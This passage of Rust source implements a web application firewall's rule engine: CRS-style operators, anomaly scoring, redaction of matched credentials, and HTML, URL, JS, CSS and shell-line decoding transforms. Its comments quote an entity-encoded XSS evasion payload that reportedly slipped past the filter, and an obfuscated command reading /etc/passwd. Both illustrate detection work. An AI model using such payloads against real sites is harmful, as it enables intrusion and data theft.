                    let hit = values.iter().find(|v| ip_in_any_cidr(v, cidrs));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "IpMatch");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateByteRange { ranges } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    // The spec lists the ALLOWED bytes; the operator fires on
                    // anything outside it. Compared over bytes, not chars: the
                    // whole point of 920270 is a NUL, and 920271 catches control
                    // characters — neither survives a lossy char conversion.
                    let hit = values.iter().find(|v| {
                        v.bytes()
                            .any(|b| !ranges.iter().any(|(lo, hi)| b >= *lo && b <= *hi))
                    });
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateByteRange");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateUrlEncoding => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| has_invalid_url_encoding(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateUrlEncoding");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateUtf8Encoding => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| has_invalid_utf8_encoding(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateUtf8Encoding");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::Never => {
                let _ = pop_strings(&mut stack);
                stack.push(StackVal::Bool(false));
            }

            Instruction::ApplyTransforms {
                transforms,
                multi_match,
            } => {
                let values = pop_strings(&mut stack);
                if transforms.is_empty() {
                    // Nothing to apply: pass the (possibly memoized) values on
                    // as they are rather than copying them.
                    stack.push(StackVal::Strings(values));
                } else if *multi_match {
                    // multiMatch: collect the original values plus the result
                    // after each cumulative transform prefix so the subsequent
                    // operator can match at any intermediate step.
                    let mut all: Vec<String> =
                        Vec::with_capacity(values.len() * (transforms.len() + 1));
                    for v in values.iter() {
                        let mut s = v.clone();
                        all.push(s.clone()); // original
                        for t in transforms.iter() {
                            s = apply_single_transform(s, t);
                            all.push(s.clone()); // after this transform
                        }
                    }
                    stack.push(StackVal::Strings(Rc::new(all)));
                } else {
                    let transformed: Vec<String> = match Rc::try_unwrap(values) {
                        Ok(owned) => owned
                            .into_iter()
                            .map(|s| apply_transforms(s, transforms))
                            .collect(),
                        // Still shared with the memo: transform copies and
                        // leave the cached values intact for the next rule.
                        Err(shared) => shared
                            .iter()
                            .map(|s| apply_transforms(s.clone(), transforms))
                            .collect(),
                    };
                    stack.push(StackVal::Strings(Rc::new(transformed)));
                }
            }

            Instruction::LoadAnomalyScore => {
                // The REQUEST total, in every phase — deliberately. The only
                // rules that read it are SRL rules, and an SRL rule scores the
                // request total even in a response phase (see fire_rule); CRS's
                // outbound total is read through TX:OUTBOUND_ANOMALY_SCORE_PLn.
                stack.push(StackVal::Int(ctx.anomaly_score as i64));
            }

            Instruction::CmpGe { threshold } => {
                let val = pop_numeric_f64(&mut stack);
                stack.push(StackVal::Bool(val >= *threshold));
            }

            Instruction::MlScore { model_id } => {
                let model_name = &ruleset.ml_models[*model_id];
                let score = ctx.ml_scores.get(model_name).copied().unwrap_or(0.0);
                stack.push(StackVal::Float(score));
            }

            Instruction::RateCheck { window_id: _ } => {
                // TODO: integrate with sentinel-modules rate-limiter in Phase 2
                stack.push(StackVal::Bool(false));
            }

            Instruction::And => {
                let b = pop_bool(&mut stack);
                let a = pop_bool(&mut stack);
                stack.push(StackVal::Bool(a && b));
            }

            Instruction::Or => {
                let b = pop_bool(&mut stack);
                let a = pop_bool(&mut stack);
                stack.push(StackVal::Bool(a || b));
            }

            Instruction::Not => match stack.pop() {
                Some(StackVal::Absent) => stack.push(StackVal::Bool(false)),
                Some(StackVal::Bool(b)) => stack.push(StackVal::Bool(!b)),
                other => {
                    warn!("VM: Not: unexpected stack value {:?}", other);
                    stack.push(StackVal::Bool(false));
                }
            },

            Instruction::JmpIfFalse { offset } => {
                if let Some(StackVal::Bool(false)) = stack.last() {
                    let new_ip = (ip as i64 + *offset as i64) as usize;
                    ip = new_ip;
                    continue;
                }
            }

            Instruction::RuleEnd { rule_id } => {
                let fired = pop_bool(&mut stack);
                let matched_target = if targets_seen == 1 {
                    last_target.take().map(TargetSpec::label)
                } else {
                    None
                };
                last_target = None;
                targets_seen = 0;
                let matched_value = last_matched.take();
                if fired {
                    if let Some(meta) = ruleset.rule_meta.get(rule_id) {
                        // Redact at capture time, so a credential never enters
                        // RuleMatch and no consumer can leak what it never got.
                        // A cookie value first — every one, whatever its name —
                        // then any sensitively-named field.
                        let matched_value = matched_value.map(|v| {
                            let cookies = cookie_values.get_or_insert_with(|| {
                                sentinel_core::redact::request_cookie_values(&ctx.request_headers)
                            });
                            if let Some(w) =
                                sentinel_core::redact::withheld_cookie_value(&v, cookies)
                            {
                                return w;
                            }
                            let sensitive = sensitive_values
                                .get_or_insert_with(|| collect_sensitive_values(ctx, &views));
                            if value_is_sensitive(sensitive, &v) {
                                "[redacted: sensitive field]".to_string()
                            } else {
                                v
                            }
                        });
                        fire_rule(ctx, meta, matched_target, matched_value);
                        // skipAfter: scan forward for the named Marker and jump to it.
                        // ip += 1 at loop end then steps past the Marker (which is a no-op).
                        if let Some(marker) = &meta.skip_after {
                            let search_from = ip + 1;
                            if let Some(rel) = program[search_from..].iter().position(|instr| {
                                if let Instruction::Marker(m) = instr {
                                    m == marker
                                } else {
                                    false
                                }
                            }) {
                                ip = search_from + rel;
                            }
                        }
                        // Short-circuit: if anomaly score exceeds threshold, block immediately.
                        // In a response phase the caller passes the OUTBOUND
                        // threshold, for the outbound total; the request total
                        // there (an operator's SRL response rule adds to it) is
                        // judged against the site's own threshold, which the
                        // proxy stamps on the context.
                        let hit = if !(anomaly_threshold > 0 && ctx.decision != WafDecision::Block)
                        {
                            None
                        } else if !response_phase {
                            (ctx.anomaly_score >= anomaly_threshold).then_some((
                                "anomaly score",
                                ctx.anomaly_score,
                                anomaly_threshold,
                            ))
                        } else if ctx.outbound_anomaly_score >= anomaly_threshold {
                            Some((
                                "outbound anomaly score",
                                ctx.outbound_anomaly_score,
                                anomaly_threshold,
                            ))
                        } else {
                            ctx.anomaly_threshold
                                .filter(|t| *t > 0 && ctx.anomaly_score >= *t)
                                .map(|t| ("anomaly score", ctx.anomaly_score, t))
                        };
                        if let Some((which, score, t)) = hit {
                            ctx.decision = WafDecision::Block;
                            ctx.block_reason = Some(format!("{which} {score} >= threshold {t}"));
                            return WafDecision::Block;
                        }
                    } else {
                        warn!(rule_id, "RuleEnd: no metadata found for rule");
                    }
                }
            }

            Instruction::Marker(_) => {
                // Named label — no-op at runtime; used as a skip target.
            }
        }
        ip += 1;
    }

    ctx.decision.clone()
}

fn fire_rule(
    ctx: &mut RequestContext,
    meta: &RuleMeta,
    matched_target: Option<String>,
    matched_value: Option<String>,
) {
    let phase = rule_phase_to_phase(meta.phase);

    match &meta.action {
        RuleAction::Block => {
            if ctx.decision != WafDecision::Block {
                ctx.decision = WafDecision::Block;
                ctx.block_reason = Some(meta.message.clone());
            }
        }
        RuleAction::Allow => {
            ctx.decision = WafDecision::Allow;
        }
        RuleAction::Challenge(_) => {
            if ctx.decision == WafDecision::Allow {
                ctx.decision = WafDecision::Challenge;
                ctx.block_reason = Some(meta.message.clone());
            }
        }
        RuleAction::Score | RuleAction::Log => {
            // No decision change; just accumulate score
        }
        RuleAction::Redirect(_) | RuleAction::PluginCall { .. } => {
            // TODO: implement in later phases
        }
    }

    // Add anomaly score — to the total of the side the RULE says it scores. A
    // CRS response rule declares `tx.outbound_anomaly_score_plN` and scores the
    // RESPONSE, judged against the outbound threshold; it must never raise the
    // request's score. Every other rule — including an operator's own SRL
    // `response_body` rule — adds to the request total and is judged against
    // the site's threshold, as it was before outbound scoring existed. Keying
    // this on the phase instead turned such a rule scoring 4 or more into a
    // standalone block at the outbound threshold. (Code review finding.)
    if meta.score_delta > 0 {
        if scores_outbound(meta) {
            ctx.outbound_anomaly_score = ctx
                .outbound_anomaly_score
                .saturating_add(meta.score_delta as u32);
        } else {
            ctx.anomaly_score = ctx.anomaly_score.saturating_add(meta.score_delta as u32);
        }
    }

    // Apply setvar mutations to the per-request TX store. Runs whenever the rule
    // fires — including "silent" score-gate rules below — so category scores
    // (tx.sql_injection_score, …) and correlation state accumulate for later
    // rules to read via `TX:` targets.
    for sv in &meta.setvars {
        apply_setvar(ctx, sv);
    }

    // Only record in rule_matches when the rule has observable effect.
    // CRS paranoia-level skip-gates (pass, no score, no message) are silent.
    let is_silent = meta.message.is_empty()
        && meta.score_delta <= 0
        && matches!(meta.action, RuleAction::Score | RuleAction::Log);

    if !is_silent {
        ctx.rule_matches.push(RuleMatch {
            rule_id: meta.id.to_string(),
            message: meta.message.clone(),
            severity: map_severity(meta.severity),
            score: meta.score_delta.max(0) as u32,
            target: matched_target.unwrap_or_default(),
            phase,
            matched_value: matched_value.unwrap_or_default(),
        });
    }

    debug!(
        rule_id = meta.id,
        message = %meta.message,
        score_delta = meta.score_delta,
        "rule fired"
    );
}

// ---------------------------------------------------------------------------
// setvar — per-request TX variable mutation
// ---------------------------------------------------------------------------

/// Apply one `setvar` mutation to the per-request TX store (`ctx.tx_vars`).
///
/// `Add`/`Sub` treat the current value and the (macro-expanded) operand as
/// integers, defaulting a missing/non-numeric value to 0 — matching CRS
/// category-score accumulation. `Set` stores the macro-expanded string as-is.
fn apply_setvar(ctx: &mut RequestContext, sv: &SetVar) {
    match &sv.op {
        SetVarOp::Unset => {
            ctx.tx_vars.remove(&sv.name);
        }
        SetVarOp::Set(val) => {
            let expanded = expand_tx_macros(val, ctx);
            ctx.tx_vars.insert(sv.name.clone(), expanded);
        }
        SetVarOp::Add(expr) => {
            let delta = expand_tx_macros(expr, ctx)
                .trim()
                .parse::<i64>()
                .unwrap_or(0);
            let cur = tx_var_i64(ctx, &sv.name);
            ctx.tx_vars
                .insert(sv.name.clone(), cur.saturating_add(delta).to_string());
        }
        SetVarOp::Sub(expr) => {
            let delta = expand_tx_macros(expr, ctx)
                .trim()
                .parse::<i64>()
                .unwrap_or(0);
            let cur = tx_var_i64(ctx, &sv.name);
            ctx.tx_vars
                .insert(sv.name.clone(), cur.saturating_sub(delta).to_string());
        }
    }
}

/// Read a TX variable as an integer, treating missing/non-numeric as 0.
fn tx_var_i64(ctx: &RequestContext, name: &str) -> i64 {
    ctx.tx_vars
        .get(name)
        .and_then(|v| v.trim().parse::<i64>().ok())
        .unwrap_or(0)
}

/// Expand `%{...}` macros in a setvar value against the current TX store and the
/// CRS numeric constants. A macro that resolves to nothing expands to an empty
/// string (which is treated as 0 in the numeric `Add`/`Sub` context). UTF-8 safe.
fn expand_tx_macros(input: &str, ctx: &RequestContext) -> String {
    if !input.contains("%{") {
        return input.to_owned();
    }
    let mut out = String::with_capacity(input.len());
    let mut rest = input;
    while let Some(start) = rest.find("%{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        match after.find('}') {
            Some(end) => {
                out.push_str(&resolve_macro(&after[..end], ctx));
                rest = &after[end + 1..];
            }
            None => {
                // Unterminated `%{` — emit the literal remainder verbatim.
                out.push_str(&rest[start..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Resolve a single macro body such as `tx.critical_anomaly_score`. Only `tx.*`
/// references (and their CRS numeric-constant fallbacks) are modelled; any other
/// collection resolves to an empty string.
fn resolve_macro(inner: &str, ctx: &RequestContext) -> String {
    let lower = inner.trim().to_ascii_lowercase();
    match lower.strip_prefix("tx.") {
        Some(var) => {
            let key = var.to_ascii_uppercase();
            ctx.tx_vars
                .get(&key)
                .cloned()
                .or_else(|| crs_constant(&key).map(str::to_owned))
                .unwrap_or_default()
        }
        None => String::new(),
    }
}

/// Expand `%{...}` macros in an OPERATOR pattern, returning `None` if any of
/// them cannot be resolved to a non-empty value.
///
/// Deliberately stricter than [`expand_tx_macros`], which is for `setvar` values
/// and resolves the unknown to `""`. An empty expansion is harmless in a setvar
/// and catastrophic in an operator: CRS has rules of the form
/// `REQUEST_METHOD "!@within %{tx.allowed_methods}"`, and an empty allow-list
/// means every method is "not within" it — i.e. deny every request. Returning
/// `None` lets the VM push `Absent`, which `Not` keeps false.
fn expand_operator_macros(raw: &str, ctx: &RequestContext) -> Option<String> {
    let mut out = String::with_capacity(raw.len());
    let mut rest = raw;
    while let Some(start) = rest.find("%{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let end = after.find('}')?; // unterminated macro — refuse to guess
        out.push_str(&resolve_operator_macro(&after[..end], ctx)?);
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    Some(out)
}

/// Resolve one macro body for an operator pattern. `None` means "not available",
/// which is different from "empty" — see [`expand_operator_macros`].
fn resolve_operator_macro(inner: &str, ctx: &RequestContext) -> Option<String> {
    let lower = inner.trim().to_ascii_lowercase();
    // `tx.NAME`, including the numeric capture slots `tx.1`..`tx.9`.
    if let Some(var) = lower.strip_prefix("tx.") {
        let key = var.to_ascii_uppercase();
        let v = ctx
            .tx_vars
            .get(&key)
            .cloned()
            .or_else(|| crs_constant(&key).map(str::to_owned))?;
        return (!v.is_empty()).then_some(v);
    }
    // `request_headers.NAME` — used by the RFI and session-fixation rules to
    // compare a candidate host against the request's own Host.
    if let Some(name) = lower.strip_prefix("request_headers.") {
        let v = header_text(ctx.request_headers.get(name)?).into_owned();
        return (!v.is_empty()).then_some(v);
    }
    None
}

/// CRS numeric constants normally seeded by `crs-setup.conf`. Referenced by
/// category-score setvars like `setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score}`.
fn crs_constant(key_upper: &str) -> Option<&'static str> {
    match key_upper {
        "CRITICAL_ANOMALY_SCORE" => Some("5"),
        "ERROR_ANOMALY_SCORE" => Some("4"),
        "WARNING_ANOMALY_SCORE" => Some("3"),
        "NOTICE_ANOMALY_SCORE" => Some("2"),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Transform helpers
// ---------------------------------------------------------------------------

/// Apply all transforms in declaration order (strictly chained output → input).
fn apply_transforms(mut s: String, transforms: &[Transform]) -> String {
    for t in transforms {
        s = apply_single_transform(s, t);
    }
    s
}

/// Apply `f` repeatedly (up to `max` passes) until the output stops changing —
/// unwraps multi-layer encoding (double/triple URL-encoding `%253C` -> `%3C` ->
/// `<`, nested HTML entities) that single-pass decoding misses. Used only for
/// decoders that are idempotent once fully decoded, so benign text stabilises
/// after one pass and is left unchanged. NOT used for base64/hex, where a second
/// pass can spuriously "decode" already-plaintext into garbage.
///
/// Linear as long as `f` is: at most `max` passes, and decoding never grows
/// the value. `f` borrows, so a pass costs one allocation, not a clone plus one.
fn to_fixpoint(mut cur: String, max: usize, f: impl Fn(&str) -> String) -> String {
    for _ in 0..max {
        let next = f(&cur);
        if next == cur {
            break;
        }
        cur = next;
    }
    cur
}

/// Apply a single transform step.  Used both by `apply_transforms` and by
/// the multiMatch loop in the VM.
fn apply_single_transform(s: String, t: &Transform) -> String {
    match t {
        Transform::Lowercase => s.to_ascii_lowercase(),
        // Recursive: defeats double/triple URL-encoding evasion (%253Cscript).
        Transform::UrlDecodeUni => to_fixpoint(s, 3, url_decode_uni),
        Transform::RemoveNulls => s.replace('\0', ""),
        Transform::ReplaceNulls => s.replace('\0', " "),
        // Recursive: defeats nested HTML-entity encoding (&amp;#60; -> &#60; -> <).
        Transform::HtmlEntityDecode => to_fixpoint(s, 3, decode_html_entities),
        Transform::RemoveWhitespace => s.chars().filter(|c| !c.is_ascii_whitespace()).collect(),
        Transform::CompressWhitespace => compress_whitespace(s),
        Transform::JsDecode => decode_js_escapes(s),
        Transform::CssDecode => decode_css_escapes(s),
        Transform::Base64Decode => base64_decode_transform(&s),
        Transform::HexDecode => hex_decode_transform(&s),
        Transform::NormalisePath => normalise_path_transform(s.replace('\\', "/")),
        Transform::NormalisePathWin => normalise_path_transform(s.replace('\\', "/")),
        Transform::Trim => s.trim().to_owned(),
        Transform::TrimLeft => s.trim_start().to_owned(),
        Transform::TrimRight => s.trim_end().to_owned(),
        // UTF-8 to Unicode — replace non-ASCII bytes with \uXXXX (basic ASCII pass-through)
        Transform::Utf8ToUnicode => s
            .chars()
            .flat_map(|c| {
                if c.is_ascii() {
                    vec![c]
                } else {
                    format!("\\u{:04X}", c as u32).chars().collect::<Vec<_>>()
                }
            })
            .collect(),
        // Comment removal — strip /* ... */ style C comments
        Transform::RemoveCommentsChar => remove_comments_char(s),
        Transform::RemoveComments => remove_sql_comments(s),
        Transform::ReplaceComments => replace_sql_comments(s),
        Transform::CmdLine => cmdline_transform(&s),
        Transform::EscapeSeqDecode => escape_seq_decode(s),
        Transform::Length => s.len().to_string(),
    }
}

/// ModSecurity `t:cmdLine` — normalize shell command-line obfuscation so the
/// RCE detection rules can match. Deletes `\ " ' ^`; deletes a space that
/// precedes `/` or `(`; turns `,` and `;` into spaces; collapses runs of
/// whitespace to a single space; lowercases. e.g. `c"a"t /e''tc/passwd` → `cat /etc/passwd`.
fn cmdline_transform(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut prev_space = false;
    for c in s.chars() {
        match c {
            '\\' | '"' | '\'' | '^' => continue, // deleted
            ',' | ';' => {
                if !prev_space {
                    out.push(' ');
                    prev_space = true;
                }
            }
            '/' | '(' => {
                // delete the single space that immediately precedes it
                if prev_space && out.ends_with(' ') {
                    out.pop();
                }
                out.push(c.to_ascii_lowercase());
                prev_space = false;
            }
            c if c.is_ascii_whitespace() => {
                if !prev_space {
                    out.push(' ');
                    prev_space = true;
                }
            }
            c => {
                out.push(c.to_ascii_lowercase());
                prev_space = false;
            }
        }
    }
    out
}

/// ModSecurity `t:escapeSeqDecode` — decode ANSI-C escape sequences: `\xHH`,
/// octal `\NNN` (1–3 digits), and the single-char escapes `\a \b \f \n \r \t
/// \v \\ \? \' \"`. Unknown escapes are passed through unchanged.
fn escape_seq_decode(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            Some('x') | Some('X') => {
                chars.next();
                let mut hex = String::new();
                while hex.len() < 2 && chars.peek().map(|c| c.is_ascii_hexdigit()) == Some(true) {
                    hex.push(chars.next().unwrap());
                }
                match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                    Some(ch) if !hex.is_empty() => out.push(ch),
                    _ => {
                        out.push('\\');
                        out.push('x');
                        out.push_str(&hex);
                    }
                }
            }
            Some(d) if ('0'..='7').contains(&d) => {
                let mut oct = String::new();
                while oct.len() < 3 && chars.peek().map(|c| ('0'..='7').contains(c)) == Some(true) {
                    oct.push(chars.next().unwrap());
                }
                match u32::from_str_radix(&oct, 8).ok().and_then(char::from_u32) {
                    Some(ch) => out.push(ch),
                    None => {
                        out.push('\\');
                        out.push_str(&oct);
                    }
                }
            }
            Some(esc) => {
                chars.next();
                let decoded = match esc {
                    'a' => Some('\u{07}'),
                    'b' => Some('\u{08}'),
                    'f' => Some('\u{0C}'),
                    'n' => Some('\n'),
                    'r' => Some('\r'),
                    't' => Some('\t'),
                    'v' => Some('\u{0B}'),
                    '\\' => Some('\\'),
                    '?' => Some('?'),
                    '\'' => Some('\''),
                    '"' => Some('"'),
                    _ => None,
                };
                match decoded {
                    Some(ch) => out.push(ch),
                    None => {
                        out.push('\\');
                        out.push(esc);
                    }
                }
            }
            None => out.push('\\'),
        }
    }
    out
}

/// Decode HTML entities like ModSecurity's `t:htmlEntityDecode`: any decimal
/// `&#DDD;` and hex `&#xHH;`/`&#XHH;` numeric entity (trailing `;` optional),
/// plus the common named entities. Previously only a fixed ~13-entry table,
/// which let attackers evade the 39 XSS/SQLi rules that rely on this transform
/// via arbitrary numeric entities (e.g. `&#40;` → `(`, `&#x61;` → `a`).
///
/// Works on the `&str` itself: every index it computes sits on an ASCII byte
/// (`&`, `#`, a digit, `;`), so slicing never splits a character. It used to
/// copy the value into a `Vec<char>`, then build a window `String` and try all
/// 33 names against it for every `&` — linear, but the slowest transform by far
/// (~0.5 s on 1 MB of `&` in the test profile).
fn decode_html_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_owned();
    }
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while let Some(p) = s[i..].find('&') {
        out.push_str(&s[i..i + p]);
        i += p;
        // Numeric entity: &#DDD; (decimal) or &#xHH; / &#XHH; (hex).
        if i + 2 < b.len() && b[i + 1] == b'#' {
            let (is_hex, start) = if matches!(b[i + 2], b'x' | b'X') {
                (true, i + 3)
            } else {
                (false, i + 2)
            };
            let digits = b[start..]
                .iter()
                .take_while(|c| {
                    if is_hex {
                        c.is_ascii_hexdigit()
                    } else {
                        c.is_ascii_digit()
                    }
                })
                .count();
            if digits > 0 {
                let mut j = start + digits;
                let radix = if is_hex { 16 } else { 10 };
                if let Some(ch) = u32::from_str_radix(&s[start..j], radix)
                    .ok()
                    .and_then(char::from_u32)
                {
                    out.push(ch);
                    if b.get(j) == Some(&b';') {
                        j += 1; // consume optional trailing ';'
                    }
                    i = j;
                    continue;
                }
            }
        }
        // Named entities (require the trailing ';').
        //
        // HTML5 named entities for ASCII punctuation.
        //
        // This list held six entries — the ones everybody remembers — and that
        // gap was a live XSS bypass, measured by GoTestWAF on 2026-09-15:
        //
        //     &gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;
        //
        // reached the application with a 200. A browser resolves `&amp;lpar;`
        // to `&lpar;` and then to `(`, so it reads that as `confirm(1)` and
        // runs it. The decoder stopped at `&lpar;`, every XSS rule downstream
        // saw a string with no parentheses, and nothing fired. The same payload
        // spelled with literal brackets was a 403.
        //
        // So the entities that matter for evasion are the PUNCTUATION ones —
        // the characters that make a payload syntactically executable. They are
        // all here now, and a name is matched whole, up to its `;`, so one that
        // starts like another (`&comma;` / `&commat;`) cannot shadow it.
        //
        // Decoding more of them is strictly more correct, not more aggressive:
        // it makes the inspected string closer to what the browser will
        // actually execute, which is the whole purpose of the transform.
        const NAMED: &[(&str, char)] = &[
            ("&NewLine;", '\n'),
            ("&percnt;", '%'),
            ("&lowbar;", '_'),
            ("&period;", '.'),
            ("&dollar;", '$'),
            ("&commat;", '@'),
            ("&excl;", '!'),
            ("&quest;", '?'),
            ("&grave;", '`'),
            ("&equals;", '='),
            ("&colon;", ':'),
            ("&comma;", ','),
            ("&nbsp;", ' '),
            ("&quot;", '"'),
            ("&apos;", '\''),
            ("&verbar;", '|'),
            ("&plus;", '+'),
            ("&minus;", '-'),
            ("&lpar;", '('),
            ("&rpar;", ')'),
            ("&lsqb;", '['),
            ("&rsqb;", ']'),
            ("&lcub;", '{'),
            ("&rcub;", '}'),
            ("&bsol;", '\\'),
            ("&sol;", '/'),
            ("&semi;", ';'),
            ("&num;", '#'),
            ("&ast;", '*'),
            ("&Tab;", '\t'),
            ("&amp;", '&'),
            ("&lt;", '<'),
            ("&gt;", '>'),
        ];
        // A name's only `;` is its last byte, so the one candidate is the text
        // up to the first `;`, looked for no further than the longest name.
        // (A window shorter than that once made every name past the original
        // six undecodable; an unbounded one would rescan the value per `&`.)
        const LONGEST: usize = {
            let (mut k, mut longest) = (0, 0);
            while k < NAMED.len() {
                if NAMED[k].0.len() > longest {
                    longest = NAMED[k].0.len();
                }
                k += 1;
            }
            longest
        };
        let window = &b[i..b.len().min(i + LONGEST)];
        if let Some(semi) = window.iter().position(|&c| c == b';') {
            let name = &window[..=semi];
            if let Some((_, ch)) = NAMED.iter().find(|(ent, _)| ent.as_bytes() == name) {
                out.push(*ch);
                i += name.len();
                continue;
            }
        }
        out.push('&');
        i += 1;
    }
    out.push_str(&s[i..]);
    out
}

fn compress_whitespace(s: String) -> String {
    let mut out = String::with_capacity(s.len());
    let mut prev_space = false;
    for c in s.chars() {
        if c.is_ascii_whitespace() {
            if !prev_space {
                out.push(' ');
            }
            prev_space = true;
        } else {
            out.push(c);
            prev_space = false;
        }
    }
    out
}

fn decode_js_escapes(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            Some('u') => {
                chars.next();
                let hex: String = chars.by_ref().take(4).collect();
                if hex.len() == 4 {
                    if let Ok(n) = u32::from_str_radix(&hex, 16) {
                        if let Some(ch) = char::from_u32(n) {
                            out.push(ch);
                            continue;
                        }
                    }
                }
                out.push('\\');
                out.push('u');
                out.push_str(&hex);
            }
            Some('x') => {
                chars.next();
                let hex: String = chars.by_ref().take(2).collect();
                if hex.len() == 2 {
                    if let Ok(n) = u32::from_str_radix(&hex, 16) {
                        if let Some(ch) = char::from_u32(n) {
                            out.push(ch);
                            continue;
                        }
                    }
                }
                out.push('\\');
                out.push('x');
                out.push_str(&hex);
            }
            Some('n') => {
                chars.next();
                out.push('\n');
            }
            Some('r') => {
                chars.next();
                out.push('\r');
            }
            Some('t') => {
                chars.next();
                out.push('\t');
            }
            Some('\\') => {
                chars.next();
                out.push('\\');
            }
            _ => out.push('\\'),
        }
    }
    out
}

/// Decode CSS hex escape sequences: `\NNNNNN` (1-6 hex digits) optionally
/// followed by a single whitespace character or semicolon.
///
/// Examples: `\0041` → `A`, `\26 ` → `&`, `\000026;` → `&`.
fn decode_css_escapes(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        // Collect up to 6 hex digits.
        let mut hex = String::new();
        while hex.len() < 6 {
            match chars.peek() {
                Some(&h) if h.is_ascii_hexdigit() => {
                    hex.push(h);
                    chars.next();
                }
                _ => break,
            }
        }
        if hex.is_empty() {
            // Not a hex escape — treat backslash literally.
            out.push('\\');
            continue;
        }
        // Consume optional trailing whitespace/semicolon (one char only).
        match chars.peek() {
            Some(&' ') | Some(&'\t') | Some(&'\n') | Some(&'\r') | Some(&'\x0C') | Some(&';') => {
                chars.next();
            }
            _ => {}
        }
        if let Ok(n) = u32::from_str_radix(&hex, 16) {
            if let Some(ch) = char::from_u32(n) {
                out.push(ch);
                continue;
            }
        }
        // Invalid codepoint — emit the escape literally.
        out.push('\\');
        out.push_str(&hex);
    }
    out
}

// ---------------------------------------------------------------------------
// New transform helpers (base64, hex, path normalisation, comment removal)
// ---------------------------------------------------------------------------

/// Decode standard base64 (MIME alphabet, with and without `=` padding).
/// Strips whitespace first (headers often have line breaks).
/// Returns the original string unchanged on any decoding error.
fn base64_decode_transform(s: &str) -> String {
    // Strip whitespace first (headers often have line breaks).
    let cleaned: String = s.chars().filter(|c| !c.is_ascii_whitespace()).collect();
    if cleaned.len() < 8 {
        return s.to_owned();
    }
    // First pass: try to decode the cleaned string as pure Base64.
    if let Some(decoded) = try_decode_base64(&cleaned) {
        if let Ok(result) = String::from_utf8(decoded) {
            return result;
        }
    }
    // Second pass: handle URLPath case where the value starts with '/'
    // (e.g. "/DQpRVUlUDQo"). The '/' is a valid Base64 character, so the
    // first pass decodes it as part of the payload and produces garbage.
    // Stripping the leading '/' exposes the real Base64 payload.
    if let Some(stripped) = cleaned.strip_prefix('/') {
        if !stripped.is_empty() {
            if let Some(decoded) = try_decode_base64(stripped) {
                if let Ok(result) = String::from_utf8(decoded) {
                    return result;
                }
            }
        }
    }
    s.to_owned()
}

/// Try to decode a Base64 string (with auto-padding for unpadded input).
/// Returns None if the string contains non-Base64 characters.
fn try_decode_base64(input: &str) -> Option<Vec<u8>> {
    let mut padded = input.to_owned();
    let rem = padded.len() % 4;
    if rem != 0 {
        for _ in 0..(4 - rem) {
            padded.push('=');
        }
    }
    let bytes = padded.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len() * 3 / 4);
    let mut i = 0;
    while i + 3 < bytes.len() {
        let b0 = decode_b64_byte(bytes[i])?;
        let b1 = decode_b64_byte(bytes[i + 1])?;
        let b2 = decode_b64_byte(bytes[i + 2])?;
        let b3 = decode_b64_byte(bytes[i + 3])?;
        out.push((b0 << 2) | (b1 >> 4));
        if bytes[i + 2] != b'=' {
            out.push((b1 << 4) | (b2 >> 2));
        }
        if bytes[i + 3] != b'=' {
            out.push((b2 << 6) | b3);
        }
        i += 4;
    }
    Some(out)
}

fn decode_b64_byte(c: u8) -> Option<u8> {
    match c {
        b'A'..=b'Z' => Some(c - b'A'),
        b'a'..=b'z' => Some(c - b'a' + 26),
        b'0'..=b'9' => Some(c - b'0' + 52),
        b'+' => Some(62),
        b'/' => Some(63),
        b'=' => Some(0),
        _ => None,
    }
}

/// Decode a hex-encoded string (optional `0x`/`0X` prefix; even-length hex bytes).
/// Returns original on error or invalid input.
fn hex_decode_transform(s: &str) -> String {
    let hex = s
        .strip_prefix("0x")
        .or_else(|| s.strip_prefix("0X"))
        .unwrap_or(s)
        .trim();
    if hex.is_empty() || hex.len() % 2 != 0 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
        return s.to_owned();
    }
    let bytes: Option<Vec<u8>> = (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect();
    bytes
        .and_then(|b| String::from_utf8(b).ok())
        .unwrap_or_else(|| s.to_owned())
}

/// Collapse `..` and `.` path segments; deduplicate adjacent slashes.
fn normalise_path_transform(s: String) -> String {
